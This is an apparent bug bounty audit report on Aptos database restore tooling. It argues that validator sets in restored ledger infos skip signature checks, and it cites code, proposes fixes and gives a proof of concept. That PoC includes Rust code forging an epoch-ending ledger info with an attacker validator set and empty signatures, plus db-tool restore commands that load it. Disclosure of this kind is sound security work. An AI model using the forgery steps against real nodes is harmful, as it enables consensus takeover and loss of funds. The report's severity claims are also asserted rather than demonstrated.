# Audit Report

## Title
Unauthenticated Validator Set Injection During Database Restore Allows Consensus Takeover

## Summary
During database restore operations, validator set changes embedded in epoch-crossing transactions are persisted to the database without cryptographic validation of the `next_epoch_state` field in `LedgerInfoWithSignatures`. This allows an attacker who controls the backup source to inject arbitrary validator sets, enabling complete consensus takeover and network partition.

## Finding Description

The vulnerability exists in multiple restore code paths where `LedgerInfoWithSignatures` containing `next_epoch_state` (the new validator set for the next epoch) are saved to the database without verifying the signatures or validating the validator set itself.

**Primary Vulnerability in `restore_utils.rs`:**

The `save_ledger_infos` function directly saves ledger infos without any cryptographic validation: [1](#0-0) 

It calls `save_ledger_infos_impl` which simply writes to the database: [2](#0-1) 

**Missing Validation in Normal Commit Path:**

Even when ledger infos go through the normal commit path, `check_and_put_ledger_info` only validates version, root hash, epoch continuity, and state snapshot existence—**NOT the validator set or signatures**: [3](#0-2) 

**Multiple Attack Vectors:**

1. **Using `--skip-epoch-endings` flag:** The restore coordinator allows skipping epoch validation via command-line flag, setting `epoch_history = None`: [4](#0-3) 

2. **Using `Oneoff::Transaction` restore:** This command **always** passes `None` for `epoch_history`, bypassing all signature verification: [5](#0-4) 

3. **Using `Oneoff::StateSnapshot` restore:** Similarly passes `None` for `epoch_history`: [6](#0-5) 

When `epoch_history` is `None`, the critical signature verification is skipped entirely: [7](#0-6) 

**Epoch State Retrieval Uses Unvalidated Data:**

The restored validator set is later retrieved by `get_epoch_state`, which directly extracts `next_epoch_state` from the stored (unvalidated) ledger info: [8](#0-7) 

This `EpochState` containing the attacker's validator set is then used for consensus verification: [9](#0-8) 

**Attack Scenario:**

1. Attacker compromises backup storage (cloud storage misconfiguration, MITM attack, etc.)
2. Attacker creates malicious backup with crafted epoch-ending `LedgerInfoWithSignatures` where `next_epoch_state` contains attacker-controlled validator public keys
3. Victim runs restore using standard commands:
   - `db-tool restore oneoff transaction --transaction-manifest <manifest>` (always bypasses validation)
   - `db-tool restore bootstrap-db --skip-epoch-endings` (debugging flag that bypasses validation)
4. The malicious `next_epoch_state` is persisted to database without signature verification
5. When the restored node transitions to the next epoch, it retrieves the attacker's validator set via `get_epoch_state`
6. The node now accepts blocks signed by attacker's validators, rejecting legitimate blocks
7. Network partitions into two incompatible chains (honest nodes vs. compromised nodes)

## Impact Explanation

This vulnerability meets **Critical Severity** criteria per Aptos Bug Bounty program:

- **Consensus/Safety Violation:** Breaks the fundamental BFT invariant that validator sets must be authenticated by the previous epoch's validators. Attacker gains arbitrary consensus control.

- **Non-Recoverable Network Partition:** Nodes restored from compromised backups will use different validator sets than honest nodes, creating permanent fork requiring hardfork to resolve.

- **Total Loss of Funds:** With control over consensus, attacker can:
  - Double-spend by creating conflicting blocks
  - Mint unlimited tokens via governance proposals
  - Freeze all funds by halting block production
  - Steal funds by authorizing malicious transactions

- **Violation of Cryptographic Correctness Invariant:** The system assumes all validator sets are authenticated via BLS signatures from the previous epoch's validator set. This assumption is completely violated during restore.

## Likelihood Explanation

**High Likelihood:**

- **Common Operational Scenario:** Database restore is a standard operational procedure for:
  - Setting up new validator nodes
  - Disaster recovery after hardware failure
  - Network bootstrapping after upgrades
  - State sync optimization

- **Multiple Attack Paths:** The vulnerability can be triggered through:
  - Standard `oneoff transaction` restore command (always vulnerable)
  - Standard `oneoff state-snapshot` restore command (always vulnerable)
  - Bootstrap restore with debugging flag (explicitly bypasses validation)

- **Realistic Attacker Capabilities:** Compromising backup sources is achievable via:
  - Cloud storage misconfigurations (publicly accessible S3 buckets)
  - Compromised backup service credentials
  - Man-in-the-middle attacks on backup downloads
  - Malicious backup service providers

- **No User Warning:** The commands don't warn users that validator sets won't be validated, and the `--skip-epoch-endings` flag is described merely as "for debugging" without security implications.

## Recommendation

**Immediate Fix:**

1. **Mandatory Epoch History Validation:** Remove the ability to skip epoch history validation. Delete the `skip_epoch_endings` flag and always require epoch history verification:

```rust
// In coordinators/restore.rs, remove skip_epoch_endings option
// Always build and verify epoch history:
let epoch_history = Some(Arc::new(
    EpochHistoryRestoreController::new(
        epoch_handles,
        self.global_opt.clone(),
        self.storage.clone(),
    )
    .run()
    .await?,
));
```

2. **Fix Oneoff Restore Commands:** Require epoch history for all restore operations:

```rust
// In db-tool/src/restore.rs
Oneoff::Transaction { storage, opt, global } => {
    // Build epoch history first
    let epoch_history = build_epoch_history(&storage, &global).await?;
    
    TransactionRestoreController::new(
        opt,
        global.try_into()?,
        storage.init_storage().await?,
        Some(epoch_history), // REQUIRED, not None
        VerifyExecutionMode::NoVerify,
    )
    .run()
    .await?;
}
```

3. **Add Validation in `save_ledger_infos`:** Even during restore, verify signatures on epoch-ending ledger infos:

```rust
fn save_ledger_infos_impl(
    ledger_metadata_db: &LedgerMetadataDb,
    ledger_infos: &[LedgerInfoWithSignatures],
    batch: &mut SchemaBatch,
    epoch_verifier: Option<&Arc<ValidatorVerifier>>,
) -> Result<()> {
    for li in ledger_infos.iter() {
        if li.ledger_info().ends_epoch() {
            // Require signature verification for epoch-ending LIs
            if let Some(verifier) = epoch_verifier {
                li.verify_signatures(verifier)?;
            } else {
                return Err(anyhow!("Epoch-ending LedgerInfo requires signature verification"));
            }
        }
        ledger_metadata_db.put_ledger_info(li, batch)?;
    }
    Ok(())
}
```

4. **Add Runtime Validation:** In `check_and_put_ledger_info`, verify that epoch-ending ledger infos are properly signed:

```rust
// In aptosdb_writer.rs check_and_put_ledger_info()
if ledger_info_with_sig.ledger_info().ends_epoch() {
    // Verify signatures using current epoch's validator set
    let current_epoch_state = self.ledger_db.metadata_db().get_epoch_state(
        ledger_info_with_sig.ledger_info().epoch()
    )?;
    ledger_info_with_sig.verify_signatures(&current_epoch_state.verifier)?;
}
```

## Proof of Concept

**Prerequisites:**
- Aptos node with `db-tool` binary
- Access to create/modify backup files

**Step 1: Create Malicious Backup**

```rust
// Create a fake epoch-ending LedgerInfo with attacker's validator set
use aptos_types::ledger_info::LedgerInfo;
use aptos_types::epoch_state::EpochState;
use aptos_types::validator_verifier::ValidatorVerifier;
use aptos_crypto::ed25519::Ed25519PrivateKey;

// Attacker generates their own validator keys
let attacker_private_key = Ed25519PrivateKey::generate_for_testing();
let attacker_public_key = attacker_private_key.public_key();

// Create malicious validator set containing only attacker
let malicious_validator_set = vec![
    ValidatorInfo::new(attacker_public_key, 1000),
];
let malicious_verifier = ValidatorVerifier::new(malicious_validator_set);

// Create epoch-ending LedgerInfo with malicious next_epoch_state
let mut ledger_info = LedgerInfo::new(
    BlockInfo::new(
        1, // epoch
        0, // round  
        HashValue::zero(), // id
        HashValue::zero(), // executed_state_id
        1000, // version
        0, // timestamp
        Some(EpochState::new(2, malicious_verifier)), // MALICIOUS next_epoch_state
    ),
    HashValue::zero(), // consensus_data_hash
);

// Create fake signatures (these won't be verified during restore!)
let fake_sigs = LedgerInfoWithSignatures::new(
    ledger_info,
    BTreeMap::new(), // Empty signatures, won't be checked!
);

// Serialize to backup file
let backup_data = bcs::to_bytes(&fake_sigs)?;
// Write to backup storage...
```

**Step 2: Restore Using Vulnerable Path**

```bash
# Using oneoff transaction restore (ALWAYS bypasses validation)
db-tool restore oneoff transaction \
    --target-db-dir /path/to/restored/db \
    --transaction-manifest malicious_backup_manifest.json

# OR using bootstrap with skip flag
db-tool restore bootstrap-db \
    --target-db-dir /path/to/restored/db \
    --skip-epoch-endings \
    --metadata-cache-dir ./metadata
```

**Step 3: Verify Malicious Validator Set Was Restored**

```rust
// Query the restored database
let db = AptosDB::open(...);
let epoch_state = db.get_epoch_state(2)?; // Get epoch 2 validator set

// This will contain the attacker's validators!
assert!(epoch_state.verifier.contains(attacker_public_key));
```

**Result:** The restored node now trusts the attacker's validator set for epoch 2, enabling consensus takeover.

**Notes**
- The vulnerability is exacerbated by the fact that epoch history restoration is explicitly marked as optional ("for debugging")
- Standard restore commands (`oneoff transaction`, `oneoff state-snapshot`) **always** bypass validation by passing `None` for `epoch_history`
- No warnings are displayed to operators that validator sets won't be authenticated
- The `check_and_put_ledger_info` function performs multiple validations but critically omits signature verification
- Once a malicious validator set is restored, it persists across node restarts and cannot be corrected without manual database intervention

### Citations

**File:** storage/aptosdb/src/backup/restore_utils.rs (L41-58)
```rust
pub(crate) fn save_ledger_infos(
    ledger_metadata_db: &LedgerMetadataDb,
    ledger_infos: &[LedgerInfoWithSignatures],
    existing_batch: Option<&mut SchemaBatch>,
) -> Result<()> {
    ensure!(!ledger_infos.is_empty(), "No LedgerInfos to save.");

    if let Some(existing_batch) = existing_batch {
        save_ledger_infos_impl(ledger_metadata_db, ledger_infos, existing_batch)?;
    } else {
        let mut batch = SchemaBatch::new();
        save_ledger_infos_impl(ledger_metadata_db, ledger_infos, &mut batch)?;
        ledger_metadata_db.write_schemas(batch)?;
        update_latest_ledger_info(ledger_metadata_db, ledger_infos)?;
    }

    Ok(())
}
```

**File:** storage/aptosdb/src/backup/restore_utils.rs (L179-190)
```rust
fn save_ledger_infos_impl(
    ledger_metadata_db: &LedgerMetadataDb,
    ledger_infos: &[LedgerInfoWithSignatures],
    batch: &mut SchemaBatch,
) -> Result<()> {
    ledger_infos
        .iter()
        .map(|li| ledger_metadata_db.put_ledger_info(li, batch))
        .collect::<Result<Vec<_>>>()?;

    Ok(())
}
```

**File:** storage/aptosdb/src/db/aptosdb_writer.rs (L540-601)
```rust
    fn check_and_put_ledger_info(
        &self,
        version: Version,
        ledger_info_with_sig: &LedgerInfoWithSignatures,
        ledger_batch: &mut SchemaBatch,
    ) -> Result<(), AptosDbError> {
        let ledger_info = ledger_info_with_sig.ledger_info();

        // Verify the version.
        ensure!(
            ledger_info.version() == version,
            "Version in LedgerInfo doesn't match last version. {:?} vs {:?}",
            ledger_info.version(),
            version,
        );

        // Verify the root hash.
        let db_root_hash = self
            .ledger_db
            .transaction_accumulator_db()
            .get_root_hash(version)?;
        let li_root_hash = ledger_info_with_sig
            .ledger_info()
            .transaction_accumulator_hash();
        ensure!(
            db_root_hash == li_root_hash,
            "Root hash pre-committed doesn't match LedgerInfo. pre-commited: {:?} vs in LedgerInfo: {:?}",
            db_root_hash,
            li_root_hash,
        );

        // Verify epoch continuity.
        let current_epoch = self
            .ledger_db
            .metadata_db()
            .get_latest_ledger_info_option()
            .map_or(0, |li| li.ledger_info().next_block_epoch());
        ensure!(
            ledger_info_with_sig.ledger_info().epoch() == current_epoch,
            "Gap in epoch history. Trying to put in LedgerInfo in epoch: {}, current epoch: {}",
            ledger_info_with_sig.ledger_info().epoch(),
            current_epoch,
        );

        // Ensure that state tree at the end of the epoch is persisted.
        if ledger_info_with_sig.ledger_info().ends_epoch() {
            let state_snapshot = self.state_store.get_state_snapshot_before(version + 1)?;
            ensure!(
                state_snapshot.is_some() && state_snapshot.as_ref().unwrap().0 == version,
                "State checkpoint not persisted at the end of the epoch, version {}, next_epoch {}, snapshot in db: {:?}",
                version,
                ledger_info_with_sig.ledger_info().next_block_epoch(),
                state_snapshot,
            );
        }

        // Put write to batch.
        self.ledger_db
            .metadata_db()
            .put_ledger_info(ledger_info_with_sig, ledger_batch)?;
        Ok(())
    }
```

**File:** storage/backup/backup-cli/src/coordinators/restore.rs (L219-231)
```rust
        let epoch_history = if !self.skip_epoch_endings {
            Some(Arc::new(
                EpochHistoryRestoreController::new(
                    epoch_handles,
                    self.global_opt.clone(),
                    self.storage.clone(),
                )
                .run()
                .await?,
            ))
        } else {
            None
        };
```

**File:** storage/db-tool/src/restore.rs (L83-96)
```rust
                    Oneoff::StateSnapshot {
                        storage,
                        opt,
                        global,
                    } => {
                        StateSnapshotRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                        )
                        .run()
                        .await?;
                    },
```

**File:** storage/db-tool/src/restore.rs (L97-111)
```rust
                    Oneoff::Transaction {
                        storage,
                        opt,
                        global,
                    } => {
                        TransactionRestoreController::new(
                            opt,
                            global.try_into()?,
                            storage.init_storage().await?,
                            None, /* epoch_history */
                            VerifyExecutionMode::NoVerify,
                        )
                        .run()
                        .await?;
                    },
```

**File:** storage/backup/backup-cli/src/backup_types/transaction/restore.rs (L152-154)
```rust
        if let Some(epoch_history) = epoch_history {
            epoch_history.verify_ledger_info(&ledger_info)?;
        }
```

**File:** storage/aptosdb/src/ledger_db/ledger_metadata_db.rs (L135-154)
```rust
    pub(crate) fn get_epoch_state(&self, epoch: u64) -> Result<EpochState> {
        ensure!(epoch > 0, "EpochState only queryable for epoch >= 1.",);

        let ledger_info_with_sigs =
            self.db
                .get::<LedgerInfoSchema>(&(epoch - 1))?
                .ok_or_else(|| {
                    AptosDbError::NotFound(format!("Last LedgerInfo of epoch {}", epoch - 1))
                })?;
        let latest_epoch_state = ledger_info_with_sigs
            .ledger_info()
            .next_epoch_state()
            .ok_or_else(|| {
                AptosDbError::Other(
                    "Last LedgerInfo in epoch must carry next_epoch_state.".to_string(),
                )
            })?;

        Ok(latest_epoch_state.clone())
    }
```

**File:** types/src/epoch_state.rs (L40-50)
```rust
impl Verifier for EpochState {
    fn verify(&self, ledger_info: &LedgerInfoWithSignatures) -> anyhow::Result<()> {
        ensure!(
            self.epoch == ledger_info.ledger_info().epoch(),
            "LedgerInfo has unexpected epoch {}, expected {}",
            ledger_info.ledger_info().epoch(),
            self.epoch
        );
        ledger_info.verify_signatures(&self.verifier)?;
        Ok(())
    }
```
